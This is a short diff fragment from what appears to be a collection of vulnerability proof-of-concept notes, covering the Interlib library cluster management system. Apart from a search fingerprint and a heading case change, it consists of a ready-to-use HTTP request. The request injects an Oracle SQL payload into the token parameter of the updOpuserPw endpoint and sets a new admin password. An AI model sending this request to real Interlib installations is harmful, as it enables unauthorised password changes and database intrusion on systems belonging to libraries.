@@ -8,7 +8,7 @@ body="interlib/common/" || body="Interlib图书馆集群管理系统" || body="/
 ```
 
 
-## poc
+## POC
 ```
 GET /interlib3/service/sysop/updOpuserPw?loginid=admin11&newpassword=Aa@123456&token=1%27and+ctxsys.drithsx.sn(1,(select%20111111*1111111%20from%20dual))=%272 HTTP/1.1
 Host: your-ip
